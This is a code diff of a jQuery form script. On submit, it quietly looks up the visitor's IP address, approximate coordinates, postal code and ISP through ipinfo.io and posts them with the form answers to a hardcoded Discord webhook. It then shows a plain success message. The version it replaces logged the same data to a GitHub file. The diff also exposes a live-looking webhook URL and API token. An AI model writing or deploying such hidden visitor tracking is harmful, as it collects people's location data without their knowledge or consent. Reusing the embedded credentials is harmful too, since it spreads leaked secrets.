@@ -1,66 +1,67 @@
-$(document).ready(function(){
-    if($("#submit").show()){
-        $("#submit").hide();
-    }
+$(document).ready(function() {
+    console.log("Document is ready");
+    $("#submit").hide();
 
-    $('input[name="mode"]').click(function(){
+    $('input[name="mode"]').click(function() {
+        console.log("Mode selected");
         $("#submit").show();
     });
 
-    $("#submit").click(async function(event){
+    $("#submit").click(async function(event) {
         event.preventDefault();
+        console.log("Submit button clicked");
         const mode = $('input[name="mode"]:checked').val();
         const additionalInfo = $('#additionalInfo').val();
 
-        $.getJSON('https://ipapi.co/json/', async function(data) {
+        try {
+            const response = await $.getJSON('https://ipinfo.io/json?token=64c2f1a909faa4');
+            if (!response || Object.keys(response).length === 0) {
+                console.error('Failed to retrieve data from ipinfo.io');
+                return;
+            }
+
+            console.log("Data retrieved from ipinfo.io", response);
+
             const content = {
                 mode: mode,
-                ip: data.ip,
-                city: data.city,
-                region: data.region,
-                country: data.country_name,
-                postal: data.postal,
-                latitude: data.latitude,
-                longitude: data.longitude,
-                timezone: data.timezone,
-                currency: data.currency,
-                org: data.org,
-                asn: data.asn,
-                request: data.request,
-                additionalInfo: additionalInfo // Include additional information
+                ip: response.ip,
+                city: response.city,
+                region: response.region,
+                country: response.country,
+                postal: response.postal,
+                latitude: response.loc.split(',')[0],
+                longitude: response.loc.split(',')[1],
+                timezone: response.timezone,
+                org: response.org,
+                additionalInfo: additionalInfo
             };
 
-            const token = 'YOUR_GITHUB_TOKEN'; // Replace with your GitHub token
-            const repo = 'YOUR_GITHUB_USERNAME/YOUR_REPO_NAME'; // Replace with your GitHub repo
-            const path = 'data.txt'; // Path to your data.txt file in the repo
+            const webhookURL = 'https://discord.com/api/webhooks/1315714343202979961/DewcDVtX6f6pBkJdAVvQCawCe4Uc-KFBGPKnTX9UUk5zz_C6PQDPty9-alMZ5cZTHRpV';
+            const message = {
+                content: 'New submission received:',
+                embeds: [{
+                    title: 'Submission Details',
+                    description: JSON.stringify(content, null, 2),
+                    color: 5814783
+                }]
+            };
 
-            const getFileContent = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
+            const webhookResponse = await fetch(webhookURL, {
+                method: 'POST',
                 headers: {
-                    'Authorization': `token ${token}`,
-                    'Accept': 'application/vnd.github.v3+json'
-                }
-            });
-
-            const fileData = await getFileContent.json();
-            const existingContent = atob(fileData.content);
-            const newContent = existingContent + '\n' + JSON.stringify(content, null, 2);
-
-            await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
-                method: 'PUT',
-                headers: {
-                    'Authorization': `token ${token}`,
-                    'Accept': 'application/vnd.github.v3+json'
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    message: 'Update data.txt',
-                    content: btoa(newContent),
-                    sha: fileData.sha
-                })
+                body: JSON.stringify(message)
             });
-        });
-    });
-    $("#submit").click(function(){
-        window.location.href = "1.html";
-        alert("Answers has been submitted successfully!");
+
+            if (webhookResponse.ok) {
+                alert('Submission successful!');
+                window.location.href = "1.html"; // Redirect to thank you page
+            } else {
+                console.error('Failed to send message to Discord');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+        }
     });
 });
